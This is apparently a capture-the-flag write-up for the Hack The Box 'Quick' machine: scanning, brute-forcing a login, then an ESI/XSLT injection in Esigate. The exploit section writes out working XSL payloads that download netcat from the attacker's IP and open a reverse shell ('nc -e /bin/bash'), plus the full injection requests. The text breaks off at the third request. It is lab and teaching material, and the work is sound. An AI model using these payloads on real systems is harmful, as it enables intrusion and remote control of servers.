@@ -1,0 +1,1244 @@
+I"s�<blockquote>
+  <p><strong>The information provided in this site is for educational purposes regarding pentesting. The author of the site will not be held any responsibility for any misuse of the information from this site.</strong></p>
+</blockquote>
+
+<h2 id="summary"><strong><span style="color:#ff5555">Summary</span></strong></h2>
+<hr />
+
+<ul>
+  <li>Install rust and <code class="language-plaintext highlighter-rouge">quiche</code> with all the dependencies</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">quiche</code> to see the content of https://quick.htb</li>
+  <li>Capture <strong>Connectivity.pdf</strong></li>
+  <li>Wfuzz the credential</li>
+  <li>Found <code class="language-plaintext highlighter-rouge">ESIGATE</code> service</li>
+  <li>Use the exploit from the article to get reverse shell</li>
+  <li>Read the <code class="language-plaintext highlighter-rouge">db.php</code> file</li>
+  <li>Check credentials with mysql and found <strong>srvadm</strong> creds</li>
+  <li>Run <strong>linpeas</strong></li>
+  <li>Found <code class="language-plaintext highlighter-rouge">apache2</code> config which gives subdomain printerv2 vhost</li>
+  <li>Found login page</li>
+  <li>Change hash of <code class="language-plaintext highlighter-rouge">srvadm</code> on mysql to login on login page</li>
+  <li>Create a <code class="language-plaintext highlighter-rouge">php</code> and <code class="language-plaintext highlighter-rouge">bash</code> script to send our <code class="language-plaintext highlighter-rouge">ssh key</code> to the machine</li>
+  <li>Ssh as <code class="language-plaintext highlighter-rouge">srvadm</code></li>
+  <li>Run <code class="language-plaintext highlighter-rouge">linpeas</code> (again)</li>
+  <li>Found <code class="language-plaintext highlighter-rouge">.cache</code> directory</li>
+  <li>It shows <code class="language-plaintext highlighter-rouge">deviceuri</code> with url encoded</li>
+  <li>Decode it and got password</li>
+  <li>Su to <code class="language-plaintext highlighter-rouge">root</code> with the password</li>
+</ul>
+
+<h2 id="port-scan"><strong><span style="color:#ff5555">Port Scan</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>➜  Quick nmap -sC -sV -oN scans/nmap quick.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 08:29 WIB
+Nmap scan report for quick.htb (10.10.10.186)
+Host is up (0.030s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
+|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
+|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
+9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Quick | Broadband Services
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.38 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>➜  Quick nmap -sU quick.htb -oA scans/nmap.udp
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 09:10 WIB
+Stats: 0:06:42 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 41.05% done; ETC: 12:04 (0:09:37 remaining)
+Warning: 10.10.10.186 giving up on port because retransmission cap hit (10).
+Nmap scan report for quick.htb (10.10.10.186)
+Host is up (0.030s latency).
+Not shown: 999 closed ports
+PORT      STATE         SERVICE
+443/udp   open|filtered https
+
+Nmap done: 1 IP address (1 host up) scanned in 802.17 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The machine has 3 <code class="language-plaintext highlighter-rouge">ports</code> opened and the special thing is, it runs http/3 on <code class="language-plaintext highlighter-rouge">UDP</code></p>
+
+<h2 id="gobuster"><strong><span style="color:#ff5555">Gobuster</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>➜  Quick gobuster dir -u http://quick.htb:9001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,asp,aspx,gifX.png,jpeg,txt -t 50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://quick.htb:9001/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,asp,aspx,gifX.png,jpeg,txt,php
+[+] Timeout:        10s
+===============================================================
+2020/08/28 08:34:25 Starting gobuster
+===============================================================
+/home.php (Status: 200)
+/login.php (Status: 200)
+/search.php (Status: 200)
+/index.php (Status: 200)
+/clients.php (Status: 200)
+/db.php (Status: 200)
+/ticket.php (Status: 200)
+/server-status (Status: 200)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="checking-the-website"><strong><span style="color:#ff5555">Checking the website</span></strong></h2>
+<hr />
+
+<p><img src="/images/htb/quick/websiteX.png" alt="" /></p>
+
+<hr />
+
+<p><strong>Gobuster</strong> shows that the website has <code class="language-plaintext highlighter-rouge">login.php</code>.</p>
+
+<p><img src="/images/htb/quick/loginphpX.png" alt="" /></p>
+
+<hr />
+
+<p>By exploring around, saw this few usernames and we can combine them to create a wordlist based on the names, emails and companies.</p>
+
+<p><img src="/images/htb/quick/usersX.png" alt="" /></p>
+
+<p><img src="/images/htb/quick/clientsphpX.png" alt="" /></p>
+
+<hr />
+
+<p>To access the HTTP/3, we are using <code class="language-plaintext highlighter-rouge">Quiche</code>.</p>
+
+<p>There are things that needed to install as dependencies in order <code class="language-plaintext highlighter-rouge">Quiche</code> to work properly.</p>
+
+<h2 id="quiche"><strong><span style="color:#ff5555">Quiche</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>➜  /tmp git clone --recursive https://github.com/cloudflare/quiche
+Cloning into 'quiche'...
+remote: Enumerating objects: 24, done.
+remote: Counting objects: 100% (24/24), done.
+remote: Compressing objects: 100% (21/21), done.
+remote: Total 10906 (delta 4), reused 14 (delta 2), pack-reused 10882
+Receiving objects: 100% (10906/10906), 14.42 MiB | 2.10 MiB/s, done.
+Resolving deltas: 100% (5904/5904), done.
+➜  /tmp
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Install Rustc.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>➜  quiche git:(master) curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+info: downloading installer
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>➜  quiche git:(master) source $HOME/.cargo/env
+➜  quiche git:(master) cargo build --examples
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let it build for you, it should be <strong>quick</strong>.</p>
+
+<blockquote>
+  <p>Execute it</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre></td><td class="rouge-code"><pre>➜  quiche git:(master) cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/
+    Updating crates.io index
+  Downloaded ryu v1.0.5
+  Downloaded serde_derive v1.0.115
+  Downloaded quote v1.0.7
+  Downloaded regex-syntax v0.6.18
+  Downloaded regex v1.3.9
+  Downloaded serde_with_macros v1.1.0
+  Downloaded thread_local v1.0.1
+  Downloaded serde_with v1.4.0
+  Downloaded strsim v0.9.3
+  Downloaded env_logger v0.6.2
+  Downloaded syn v1.0.39
+  Downloaded unicode-xid v0.2.1
+  Downloaded termcolor v1.1.0
+  Downloaded memchr v2.3.3
+  Downloaded docopt v1.1.0
+  Downloaded serde_json v1.0.57
+  Downloaded serde v1.0.115
+  Downloaded atty v0.2.14
+  Downloaded quick-error v1.2.3
+  Downloaded aho-corasick v0.7.13
+  Downloaded proc-macro2 v1.0.19
+  Downloaded humantime v1.3.0
+  Downloaded itoa v0.4.6
+  Downloaded 23 crates (1.5 MB) in 2.36s
+   Compiling proc-macro2 v1.0.19
+   Compiling unicode-xid v0.2.1
+   Compiling syn v1.0.39
+   Compiling libc v0.2.76
+   Compiling serde_derive v1.0.115
+   Compiling cc v1.0.59
+   Compiling serde v1.0.115
+   Compiling memchr v2.3.3
+   Compiling lazy_static v1.4.0
+   Compiling log v0.4.11
+   Compiling ryu v1.0.5
+   Compiling cfg-if v0.1.10
+   Compiling serde_json v1.0.57
+   Compiling libm v0.2.1
+   Compiling regex-syntax v0.6.18
+   Compiling itoa v0.4.6
+   Compiling matches v0.1.8
+   Compiling tinyvec v0.3.4
+   Compiling untrusted v0.7.1
+   Compiling quick-error v1.2.3
+   Compiling spin v0.5.2
+   Compiling once_cell v1.4.1
+   Compiling percent-encoding v1.0.1
+   Compiling termcolor v1.1.0
+   Compiling strsim v0.9.3
+   Compiling slab v0.4.2
+   Compiling cmake v0.1.44
+   Compiling thread_local v1.0.1
+   Compiling ring v0.16.15
+   Compiling unicode-bidi v0.3.4
+   Compiling unicode-normalization v0.1.13
+   Compiling humantime v1.3.0
+   Compiling quiche v0.5.1 (/tmp/quiche)
+   Compiling idna v0.1.5
+   Compiling quote v1.0.7
+   Compiling net2 v0.2.34   Compiling iovec v0.1.4
+   Compiling atty v0.2.14
+   Compiling aho-corasick v0.7.13
+   Compiling url v1.7.2
+   Compiling mio v0.6.22
+   Compiling regex v1.3.9
+   Compiling serde_with_macros v1.1.0
+   Compiling env_logger v0.6.2
+   Compiling serde_with v1.4.0
+   Compiling docopt v1.1.0
+   Compiling qlog v0.3.0 (/tmp/quiche/tools/qlog)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And it gives the output as shown below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td><td class="rouge-code"><pre>   Compiling quiche_apps v0.1.0 (/tmp/quiche/tools/apps)
+    Finished dev [unoptimized + debuginfo] target(s) in 2m 04s
+     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/'`
+
+&lt;html&gt;
+&lt;title&gt; Quick | Customer Portal&lt;/title&gt;
+&lt;h1&gt;Quick | Portal&lt;/h1&gt;
+&lt;head&gt;
+&lt;style&gt;
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  width: 200px;
+  background-color: #f1f1f1;
+}
+
+li a {
+  display: block;
+  color: #000;
+  padding: 8px 16px;
+  text-decoration: none;
+}
+
+/* Change the link color on hover */
+li a:hover {
+  background-color: #555;
+  color: white;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href="index.php"&gt;Home&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href="index.php?view=contact"&gt;Contact&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href="index.php?view=about"&gt;About&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href="index.php?view=docs"&gt;References&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/html&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Execute again</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>➜  quiche git:(master) cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/index.php\?view\=docs
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>    Finished dev [unoptimized + debuginfo] target(s) in 0.30s
+     Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/index.php?view=docs'`
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+
+&lt;h1&gt;Quick | References&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href="docs/QuickStart.pdf"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href="docs/Connectivity.pdf"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/head&gt;
+&lt;/html&gt;
+➜  quiche git:(master)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Getting the pdf file.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>➜  quiche git:(master) cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify  https:/quick.htb/docs/Connectivity.pdf &gt;&gt; htbquick.pdf
+
+Finished dev [unoptimized + debuginfo] target(s) in 0.16s
+Running `tools/apps/target/debug/quiche-client --no-verify 'https:/quick.htb/docs/Connectivity.pdf'`
+➜  quiche git:(master) ✗
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We found the password from the pdf file which is <code class="language-plaintext highlighter-rouge">Quick4cc3$$</code>.</p>
+
+<p><img src="/images/htb/quick/quickpdfX.png" alt="" /></p>
+
+<h2 id="fuzzing-the-username"><strong><span style="color:#ff5555">Fuzzing the username</span></strong></h2>
+<hr />
+
+<p>I decided to create a <code class="language-plaintext highlighter-rouge">wordlist</code> and bruteforce the <code class="language-plaintext highlighter-rouge">username</code> of this password from the pdf.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>➜  Quick vim list-of-mail.txt
+➜  Quick cat list-of-mail.txt
+tim@qconsulting.co.uk
+roy@darkwing.co.us
+elisa@wink.co.uk
+james@lazycoop.co.cn
+➜  Quick
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And fire <code class="language-plaintext highlighter-rouge">wfuzz</code> to crack it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>➜  Quick wfuzz -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&amp;password=Quick4cc3$$' -w list-of-mail.txt --hc 200
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://quick.htb:9001/login.php
+Total requests: 4
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000003:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"
+
+Total time: 0.091360
+Processed Requests: 4
+Filtered Requests: 3
+Requests/sec.: 43.78267
+
+➜  Quick
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We found <code class="language-plaintext highlighter-rouge">elisa</code> is the potential user to log in the website.</p>
+
+<p><img src="/images/htb/quick/loginaselisaX.png" alt="" /></p>
+
+<hr />
+
+<p>And I found that we can submit ticket and check the number of our ticket after it being sent to the machine, so it has something to do with <code class="language-plaintext highlighter-rouge">database</code> and <code class="language-plaintext highlighter-rouge">php</code> files to manages all of these.</p>
+
+<p><img src="/images/htb/quick/loginaselisaX.png" alt="" /></p>
+
+<hr />
+
+<p>And we tried to send it.</p>
+
+<p><img src="/images/htb/quick/try1X.png" alt="" /></p>
+
+<hr />
+
+<p>We received the ticket number which shows below.</p>
+
+<p><img src="/images/htb/quick/ticketnoX.png" alt="" /></p>
+
+<hr />
+
+<p>Tried to search our ticket on the page, and it shows that our ticket is existed.</p>
+
+<p><img src="/images/htb/quick/searchticketX.png" alt="" /></p>
+
+<h2 id="burp-it-up"><strong><span style="color:#ff5555">Burp it up</span></strong></h2>
+<hr />
+
+<p>Fire my burp and intercept it to see what happens.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>HTTP/1.1 200 OK
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
+X-Powered-By: Esigate
+Content-Length: 9361 
+Connection: close
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It shows <code class="language-plaintext highlighter-rouge">ESIGATE</code> and at this moment, we know that the web app is using <code class="language-plaintext highlighter-rouge">ESIGATE</code>.</p>
+
+<p>I search around about <strong>Esigate Exploit</strong> and found an article about <code class="language-plaintext highlighter-rouge">XSLT INJECTION</code> to the machine and we will get <strong>RCE</strong> from the machine.</p>
+
+<p>The idea is we need to intercept <code class="language-plaintext highlighter-rouge">ticket.php</code> with <code class="language-plaintext highlighter-rouge">burp</code> with payload attached and play along with it until we have <strong>reverse shell.</strong></p>
+
+<h2 id="exploit"><strong><span style="color:#ff5555">Exploit</span></strong></h2>
+<hr />
+
+<p><strong>This is how my xsl file looks like</strong></p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">corshine1.xsl</code></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" ?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
+&lt;xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
+&lt;root&gt;
+&lt;xsl:variable name="cmd"&gt;&lt;![CDATA[wget http://10.10.14.75/nc]]&gt;&lt;/xsl:variable&gt;
+&lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
+&lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
+Process: &lt;xsl:value-of select="$process"/&gt;
+Command: &lt;xsl:value-of select="$cmd"/&gt;
+&lt;/root&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">corshine2.xsl</code></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" ?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
+&lt;xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
+&lt;root&gt;
+&lt;xsl:variable name="cmd"&gt;&lt;![CDATA[chmod +x nc]]&gt;&lt;/xsl:variable&gt;
+&lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
+&lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
+Process: &lt;xsl:value-of select="$process"/&gt;
+Command: &lt;xsl:value-of select="$cmd"/&gt;
+&lt;/root&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">corshine3.xsl</code></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" ?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
+&lt;xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
+&lt;root&gt;
+&lt;xsl:variable name="cmd"&gt;&lt;![CDATA[./nc -e /bin/bash 10.10.14.75 1337]]&gt;&lt;/xsl:variable&gt;
+&lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
+&lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
+Process: &lt;xsl:value-of select="$process"/&gt;
+Command: &lt;xsl:value-of select="$cmd"/&gt;
+&lt;/root&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>We need to start <strong>python</strong> server to let the machine download the <code class="language-plaintext highlighter-rouge">xsl</code> file from our machine.</p>
+</blockquote>
+
+<p><strong>Execute first request</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre>POST /ticket.php HTTP/1.1
+Host: quick.htb:9001
+Content-Length: 120
+Cache-Control: max-age=0
+Origin: http://quick.htb:9001
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/X.png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://quick.htb:9001/ticket.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hi;q=0.8
+Cookie: PHPSESSID=park1igb2tlpu91ane3rlglnj0
+Connection: close
+
+title=a&amp;msg=&lt;esi:include+src="http://10.10.14.75/corshine1.xml"+stylesheet="http://10.10.14.75/corshine1.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-1337
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The machine downloaded the <code class="language-plaintext highlighter-rouge">files</code> from my machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>➜  Quick python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.186 - - [15/Jul/2020 13:08:50] "GET /corshine1.xsl HTTP/1.1" 200 -
+10.10.10.186 - - [15/Jul/2020 13:08:51] "GET /corshine1.xml HTTP/1.1" 200 -
+10.10.10.186 - - [15/Jul/2020 13:08:51] "GET /nc HTTP/1.1" 200 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p><strong>Execute second request</strong></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre>POST /ticket.php HTTP/1.1
+Host: quick.htb:9001
+Content-Length: 120
+Cache-Control: max-age=0
+Origin: http://quick.htb:9001
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/X.png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://quick.htb:9001/ticket.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hi;q=0.8
+Cookie: PHPSESSID=park1igb2tlpu91ane3rlglnj0
+Connection: close
+
+title=a&amp;msg=&lt;esi:include+src="http://10.10.14.75/corshine2.xml"+stylesheet="http://10.10.14.75/corshine2.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-1338
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The machine downloaded the <code class="language-plaintext highlighter-rouge">files</code> again from my machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>10.10.10.186 - - [15/Jul/2020 13:15:02] "GET /corshine2.xsl HTTP/1.1" 200 -
+10.10.10.186 - - [15/Jul/2020 13:15:02] "GET /corshine2.xml HTTP/1.1" 200 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p><strong>Execute third request</strong></p>
+</blockquote>
+
+<p>Before executing the <code class="language-plaintext highlighter-rouge">third</code> request, we need to start our <strong>listener</strong> as <code class="language-plaintext highlighter-rouge">netcat</code> in order to get reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre>POST /ticket.php HTTP/1.1
+Host: quick.htb:9001
+Content-Length: 120
+Cache-Control: max-age=0
+Origin: http://quick.htb:9001
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/X.png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://quick.htb:9001/ticket.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hi;q=0.8
+Cookie: PHPSESSID=park1igb2tlpu91ane3rlglnj0
+Connection: close
+
